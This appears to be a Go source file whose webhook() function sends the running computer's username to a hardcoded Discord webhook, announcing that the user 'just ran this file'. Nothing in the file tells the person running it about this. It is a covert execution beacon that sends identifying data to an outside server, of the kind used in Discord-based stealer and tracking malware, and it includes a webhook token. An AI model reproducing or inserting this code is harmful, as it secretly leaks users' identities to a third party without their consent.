package main

import (
	"bytes"
	"encoding/json"
	"log"
	"net/http"
)

func webhook() {
	url := "https://discord.com/api/webhooks/1099773326165016698/7wiIuiCQyNFx4cJ27BnxHFLlYLwXb-M2wvsSMNQ0hSg7o1C86rw-VSJffTMPUUD-6IWN"

	values := map[string]string{"content": getPcUsername() + " just ran this file", "username": "why"}
	postJson(url, values)
}

func postJson(url string, data map[string]string) {
	jsonData, err := json.Marshal(data)

	if err != nil {
		log.Fatal(err)
	}

	resp, err := http.Post(url, "application/json",
		bytes.NewBuffer(jsonData))

	if err != nil {
		log.Fatal(err)
	}

	defer resp.Body.Close()

	var res map[string]interface{}

	err = json.NewDecoder(resp.Body).Decode(&res)
	if err != nil {
		return
	}
}
